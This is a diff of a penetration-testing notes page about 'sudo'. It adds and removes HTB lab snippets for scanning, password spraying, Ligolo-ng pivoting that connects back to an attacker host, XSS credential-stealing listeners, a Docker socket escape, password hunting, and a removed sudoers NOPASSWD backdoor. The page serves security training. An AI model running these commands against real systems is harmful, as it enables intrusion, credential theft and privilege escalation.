@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/sudo.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Read sudo permissions for the current identity
+[Search this tool’s saved examples](/commands/notebook?tool=sudo) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Read sudo permissions for the current identity
 
 **Run in:** Linux target. **Requires:** Sudo installed and a terminal if authentication is required; the command may prompt for the current user's password.
 
@@ -21,76 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 sudo -l
 ```
 
-**Read the result:** Read the exact allowed command, run-as identity, argument restrictions and authentication behavior in sudo -l.
-
-**If An allowed binary is restricted by run-as identity, arguments or tags:** NOPASSWD, wildcards, environment handling and executable behavior need separate analysis; permission to run one command is not permission to run every command.
+**What the result establishes:** Read the exact allowed command, run-as identity, argument restrictions and authentication behavior in sudo -l.
 
 **Next check:** Read the entire rule including path, arguments, run-as user, SETENV/NOEXEC and password requirements; confirm the exact applicable behavior before a lab test.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://www.sudo.ws/docs/man/sudo.man/)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## sudo: choose the operation and read the result
-
-List commands the current Linux account may run through sudo.
-
-### What the result establishes
-
-Read the exact allowed command, run-as identity, argument restrictions and authentication behavior in sudo -l.
-
-### Prerequisites and common failures
-
-NOPASSWD, wildcards, environment handling and executable behavior need separate analysis; permission to run one command is not permission to run every command.
-
-### Example 1: List permitted commands
-
-Run in: **Kali / Linux**. Read the permitted user, executable, arguments, environment rules and password requirement.
-
-```bash
-sudo -l
-```
-
-### Example 2: Check without prompting
-
-Run in: **Kali / Linux**. A password-required error does not mean there are no sudo permissions.
-
-```bash
-sudo -n -l
-```
-
-## Saved commands and notebook recipes
-
-List commands the current Linux account may run through sudo.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=sudo) · [All tools](/index)
-
-## List permitted commands
-
-**Kali / Linux**
-
-```bash
-sudo -l
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Attack Path: Worked Lab — ⏱️ HOW TO USE THIS — decision header ("if you have X, do Y")](/cheatsheets/ad-attack-path-worked-example#-how-to-use-this-—-decision-header-if-you-have-x-do-y) · [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold) · [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2) · [HTB Nibbles: Walkthrough and Report — 🎓 Lessons learned](/cheatsheets/nibbles#-lessons-learned) · [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough) · [Pass the Ticket from Linux — Checking User Privileges](/password-attacks/pass-the-ticket-from-linux#checking-user-privileges) · [Privilege Escalation: Choose a Checklist — Linux](/privesc/index#linux) · [Systems & Pivoting: Enumeration Methodology — Linux identity, environment, and network](/pivoting/methodology#linux-identity-environment-and-network)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-Read the permitted user, executable, arguments, environment rules and password requirement.
 
 ## Check without prompting
 
@@ -102,11 +43,15 @@ sudo -n -l
 
 A password-required error does not mean there are no sudo permissions.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| An allowed binary is restricted by run-as identity, arguments or tags | NOPASSWD, wildcards, environment handling and executable behavior need separate analysis; permission to run one command is not permission to run every command. |
 
 ## Notebook recipes
 
-156 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+160 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -265,21 +210,6 @@ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreigh
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Active Directory Enumeration from Linux**
-
-Context from the notebook: Start the Neo4j database:  sudo neo4j start
-
-```text
-sudo neo4j start
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Active Directory Enumeration from Linux — 6. BloodHound.py](/active-directory/enumeration-linux#6-bloodhound-py) · [BloodHound: Full Reference — 7. TROUBLESHOOTING](/cheatsheets/bloodhound-complete-guide#7-troubleshooting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Internal password spraying from linux">
@@ -295,25 +225,6 @@ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Active Directory Password Spraying — Internal password spraying from linux](/active-directory/password-spraying#internal-password-spraying-from-linux)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="11. The decisive technique — running only the decryptor under QEMU">
-
-### 11. The decisive technique — running only the decryptor under QEMU
-
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
-
-```bash
-sudo apt install -y qemu-user gcc-aarch64-linux-gnu libc6-dev-arm64-cross
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 11. The decisive technique — running only the decryptor under QEMU](/research/android-malware-walkthrough#11-the-decisive-technique-—-running-only-the-decryptor-under-qemu)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -342,6 +253,59 @@ MAC Address: 00:00:00:00:00:00 (VMware)
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Attacking Email Services: Module Notes — Host - A Records](/modules/common-services/email#host-a-records)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Phase 1: External Perimeter &amp; DMZ Foothold">
+
+### Phase 1: External Perimeter & DMZ Foothold
+
+**Attacking Enterprise Networks**
+
+```bash
+mkdir -p evidence/nmap
+nmap -sT -p- --min-rate 3000 --open -oA evidence/nmap/dmz-all-tcp TARGET_IP
+nmap -sT -sV -sC -p OPEN_PORTS -oA evidence/nmap/dmz-services TARGET_IP
+sudo nmap -sU --top-ports 20 -sV -oA evidence/nmap/dmz-udp TARGET_IP
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Enterprise Networks — Phase 1: External Perimeter & DMZ Foothold](/methodology/enterprise-networks#phase-1-external-perimeter-&-dmz-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Phase 3: Multi-Hop Pivoting &amp; Internal Subnet Discovery">
+
+### Phase 3: Multi-Hop Pivoting & Internal Subnet Discovery
+
+**Attacking Enterprise Networks**
+
+```bash
+# On Kali: start proxy and check certificate fingerprint
+sudo ./proxy -selfcert
+# Inside ligolo-ng:
+certificate_fingerprint
+interface_create --name ligolo1
+
+# On Pivot Host: connect agent back to Kali
+./agent -connect LHOST:11601 -accept-fingerprint FINGERPRINT
+
+# Inside ligolo-ng: select session, start tunnel, and route internal subnet
+session
+tunnel_start --tun ligolo1
+interface_add_route --name ligolo1 --route INTERNAL_CIDR
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Enterprise Networks — Phase 3: Multi-Hop Pivoting & Internal Subnet Discovery](/methodology/enterprise-networks#phase-3-multi-hop-pivoting-&-internal-subnet-discovery)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -462,19 +426,51 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 </Accordion>
 
-<Accordion title="BloodHound — Start, Collect, and Import">
+<Accordion title="2. Subdomain &amp; Virtual Host (VHost) Discovery">
 
-### BloodHound — Start, Collect, and Import
+### 2. Subdomain & Virtual Host (VHost) Discovery
+
+**Attacking Web Applications with Ffuf**
+
+```bash
+echo "TARGET_IP DOMAIN_FQDN dev.DOMAIN_FQDN admin.DOMAIN_FQDN" | sudo tee -a /etc/hosts
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking Web Applications with Ffuf — 2. Subdomain & Virtual Host (VHost) Discovery](/web/ffuf-guide#2-subdomain-&-virtual-host-vhost-discovery)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Stop">
+
+### Stop
+
+**BloodHound**
+
+```bash
+sudo bloodhound-stop
+```
+
+</Accordion>
+
+<Accordion title="Start the application separately from collection">
+
+### Start the application separately from collection
 
 **BloodHound — Start, Collect, and Import**
 
 ```bash
+# Kali packaging that provides this launcher:
 sudo bloodhound-start
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [BloodHound — Start, Collect, and Import — Example 1: Start on Kali](/tools/bloodhound#example-1-start-on-kali) · [BloodHound — Start, Collect, and Import — Existing notes and worked examples](/tools/bloodhound#existing-notes-and-worked-examples) · [AD Lab Guide — Full Reference — Start your Kali BloodHound setup](/lab-guide/reference#start-your-kali-bloodhound-setup)
+**Original note sections:** [BloodHound — Start, Collect, and Import — Start the application separately from collection](/tools/bloodhound#start-the-application-separately-from-collection)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -498,6 +494,25 @@ sudo bloodhound-start
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [BloodHound — Start, Collect, and Import — Stop or restart](/tools/bloodhound#stop-or-restart)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Turn an edge into a concrete check">
+
+### Turn an edge into a concrete check
+
+**BloodHound — Start, Collect, and Import**
+
+```bash
+sudo bloodhound-start
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound — Start, Collect, and Import — Turn an edge into a concrete check](/tools/bloodhound#turn-an-edge-into-a-concrete-check) · [AD Lab Guide — Full Reference — Start your Kali BloodHound setup](/lab-guide/reference#start-your-kali-bloodhound-setup)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -806,7 +821,7 @@ grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password12
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [NFS Enumeration and Exports — Example 6: Linux](/enumeration/nfs-enumeration-network-file-system#example-6-linux) · [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux)
+**Original note sections:** [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -826,6 +841,65 @@ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Common Services: Personal Assessment Notes — Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)](/modules/common-services/assessment#phase-0-—-credential-access-hydra-+-rockyou-txt-against-ftp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Credential Stealing">
+
+### Credential Stealing
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo nc -lvnp 80
+listening on [any] 80 ...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Credential Stealing](/web/htb/xss#credential-stealing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mkdir /tmp/tmpserver
+grcic550@htb[/htb]$ cd /tmp/tmpserver
+grcic550@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+grcic550@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Credential Stealing](/web/htb/xss#credential-stealing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Loading a Remote Script">
+
+### Loading a Remote Script
+
+**Cross-Site Scripting (XSS) — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mkdir /tmp/tmpserver
+grcic550@htb[/htb]$ cd /tmp/tmpserver
+grcic550@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Cross-Site Scripting (XSS) — HTB Module — Loading a Remote Script](/web/htb/xss#loading-a-remote-script)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -887,6 +961,66 @@ cd FinalRecon && pip3 install -r requirements.txt && chmod +x ./finalrecon.py
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [DNS and Web Reconnaissance: Full Workflow — Quick Reference — Install Commands](/recon/dns-web-recon-cheat-sheet#quick-reference-—-install-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="FTP">
+
+### FTP
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo python -m pyftpdlib -p 21
+
+[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
+[SNIP] concurrency model: async
+[SNIP] masquerade (NAT) address: None
+[SNIP] passive ports: None
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — FTP](/web/htb/file-inclusion#ftp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="HTTP">
+
+### HTTP
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — HTTP](/web/htb/file-inclusion#http)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Inclusion — HTB Module**
+
+```text
+grcic550@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
+Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
+
+SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Inclusion — HTB Module — HTTP](/web/htb/file-inclusion#http)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1098,21 +1232,6 @@ sudo systemctl restart nginx.service
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**File Transfers for Linux and Windows**
-
-Context from the notebook: Verify:   sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
-
-```text
-sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Web Upload (Python uploadserver with HTTPS)">
@@ -1197,7 +1316,7 @@ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux) · [Bash quoting and pipelines — Example 7: Find Credentials on Linux](/field/bash#example-7-find-credentials-on-linux)
+**Original note sections:** [Find Credentials on Linux — Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1252,36 +1371,6 @@ sudo cat /tmp/target-NFS/<folder>/file.txt
 # Unmount when done (important — stale mounts freeze your terminal)
 sudo umount -f /tmp/target-NFS
 sudo umount -l /tmp/target-NFS   # if -f doesn't work
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049) · [NFS Enumeration and Exports — Example 4: NFS (Port 2049)](/enumeration/nfs-enumeration-network-file-system#example-4-nfs-port-2049)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Footprinting: Service-by-Service Lab Workflow**
-
-Context from the notebook: Lesson learned:  NFS directory showed  drwx------  owned by  nobody  — couldn't enter as normal user.  sudo ls  and  sudo cat  solved it. Also, stale NFS mounts will freeze  ls  in that directory — always unmount when the target goes down.
-
-```text
-sudo ls
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Footprinting: Service-by-Service Lab Workflow**
-
-Context from the notebook: Lesson learned:  NFS directory showed  drwx------  owned by  nobody  — couldn't enter as normal user.  sudo ls  and  sudo cat  solved it. Also, stale NFS mounts will freeze  ls  in that directory — always unmount when the target goes down.
-
-```text
-sudo cat
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -1368,21 +1457,6 @@ sudo -l
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**HTB Nibbles: Walkthrough and Report**
-
-Context from the notebook: Tried  sudo su -  out of habit — asked for a password I didn't have. Listed the home directory instead ( ls -la /home/nibbler ) and found  personal.zip  and  user.txt .
-
-```text
-sudo su -
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="Exploitation steps">
@@ -1398,36 +1472,6 @@ sudo /home/nibbler/personal/stuff/monitor.sh
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2) · [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**HTB Nibbles: Walkthrough and Report**
-
-Context from the notebook: You  must  invoke the script with the exact absolute path shown in  sudo -l .  cd -ing into  personal/stuff/  and running  sudo ./monitor.sh  or  sudo monitor.sh  will fail — the sudoers rule matches the command string literally.
-
-```text
-sudo ./monitor.sh
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**HTB Nibbles: Walkthrough and Report**
-
-Context from the notebook: You  must  invoke the script with the exact absolute path shown in  sudo -l .  cd -ing into  personal/stuff/  and running  sudo ./monitor.sh  or  sudo monitor.sh  will fail — the sudoers rule matches the command string literally.
-
-```text
-sudo monitor.sh
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps-2)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1515,6 +1559,30 @@ grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in f
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="1. Start the proxy">
+
+### 1. Start the proxy
+
+**Ligolo-ng**
+
+```bash
+sudo ./proxy -selfcert
+```
+
+</Accordion>
+
+<Accordion title="Route the internal subnet">
+
+### Route the internal subnet
+
+**Ligolo-ng**
+
+```bash
+sudo ip route add INTERNAL_SUBNET dev ligolo
+```
 
 </Accordion>
 
@@ -1655,9 +1723,30 @@ sudo ip link delete ligolo
 
 </Accordion>
 
-<Accordion title="Ligolo-ng: Quick Reference">
+<Accordion title="Create and start the tunnel">
 
-### Ligolo-ng: Quick Reference
+### Create and start the tunnel
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# Workstation shell; substitute the actual pivot-reachable CIDR.
+sudo ip route add INTERNAL_SUBNET dev ligolo
+ip route get INTERNAL_IP
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Create and start the tunnel](/pivoting/ligolo#create-and-start-the-tunnel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Isolate failures">
+
+### Isolate failures
 
 **Ligolo-ng: Quick Reference**
 
@@ -1672,7 +1761,7 @@ sudo ip link set ligolo up
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ligolo-ng: Quick Reference — Existing notes and worked examples](/pivoting/ligolo#existing-notes-and-worked-examples)
+**Original note sections:** [Ligolo-ng: Quick Reference — Isolate failures](/pivoting/ligolo#isolate-failures)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1690,16 +1779,58 @@ nxc smb 172.16.5.19
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Ligolo-ng: Quick Reference — Existing notes and worked examples](/pivoting/ligolo#existing-notes-and-worked-examples)
+**Original note sections:** [Ligolo-ng: Quick Reference — Isolate failures](/pivoting/ligolo#isolate-failures)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="Linux Authentication: PAM, passwd, and shadow">
+<Accordion title="Start the proxy and verify its identity">
 
-### Linux Authentication: PAM, passwd, and shadow
+### Start the proxy and verify its identity
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# Workstation:
+sudo ./proxy -selfcert
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Start the proxy and verify its identity](/pivoting/ligolo#start-the-proxy-and-verify-its-identity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Inspect the applicable service configuration">
+
+### Inspect the applicable service configuration
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+ls -la /etc/pam.d
+cat /etc/pam.d/sshd
+cat /etc/pam.d/su
+sudo -l
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Inspect the applicable service configuration](/password-attacks/linux-authentication-process#inspect-the-applicable-service-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify the relevant account and permission">
+
+### Verify the relevant account and permission
 
 **Linux Authentication: PAM, passwd, and shadow**
 
@@ -1711,7 +1842,7 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Existing notes and worked examples](/password-attacks/linux-authentication-process#existing-notes-and-worked-examples)
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Verify the relevant account and permission](/password-attacks/linux-authentication-process#verify-the-relevant-account-and-permission)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1727,7 +1858,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadow.hashes
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Existing notes and worked examples](/password-attacks/linux-authentication-process#existing-notes-and-worked-examples)
+**Original note sections:** [Linux Authentication: PAM, passwd, and shadow — Verify the relevant account and permission](/password-attacks/linux-authentication-process#verify-the-relevant-account-and-permission)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1794,6 +1925,31 @@ sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pi
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Linux Privilege Escalation: Full Checklist — Docker](/privesc/linux-privesc-checklist#docker)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Establish the baseline">
+
+### Establish the baseline
+
+**Linux Privilege Escalation: Full Checklist**
+
+```bash
+id
+hostname
+uname -a
+cat /etc/os-release
+pwd
+printf '%s\n' "$PATH"
+sudo -l
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Establish the baseline](/privesc/linux-privesc-checklist#establish-the-baseline)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1903,29 +2059,6 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 
 </Accordion>
 
-<Accordion title="Writable /etc/sudoers">
-
-### Writable /etc/sudoers
-
-**Linux Privilege Escalation: Full Checklist**
-
-```powershell
-echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
-
-# use SUDO without password
-echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
-echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Writable /etc/sudoers](/privesc/linux-privesc-checklist#writable-/etc/sudoers)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="sudo_inject">
 
 ### sudo_inject
@@ -1970,7 +2103,7 @@ rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Example 5: Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#example-5-rsync) · [Linux Remote Access: SSH, Rsync, and R-Services — Example 2: Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#example-2-rsync) · [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync)
+**Original note sections:** [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2031,7 +2164,7 @@ sudo nmap <IP> -sV -sC -p3306 --script mysql*
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [MySQL and MariaDB Enumeration — Example 2: Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#example-2-footprinting-&-scanning) · [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
+**Original note sections:** [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2052,7 +2185,7 @@ sudo responder -I tun0                 # capture the NetNTLM hash to crack offli
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree) · [Responder — Interface and Startup — Example 7: When you don't have sysadmin: steal the service account's hash with xp_dirtree](/tools/responder#example-7-when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2070,21 +2203,6 @@ mkdir /tmp/nfs
 sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
 sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
 sudo cat /tmp/nfs/<file>
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [NFS Enumeration and Exports — Example 3: 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#example-3-2-mount-and-browse) · [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**NFS Enumeration and Exports**
-
-Context from the notebook: Exported files often show owners like  nobody  or a specific UID with  drwx------ . Your normal user's UID won't match, so listing/reading fails —  sudo  (UID 0) sidesteps it for browsing. If a file is owned by a  specific  UID you need to act as, create a matching local user ( sudo useradd -u &lt;UID> tempuser ) and  su  to it.
-
-```text
-sudo useradd -u <UID> tempuser
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
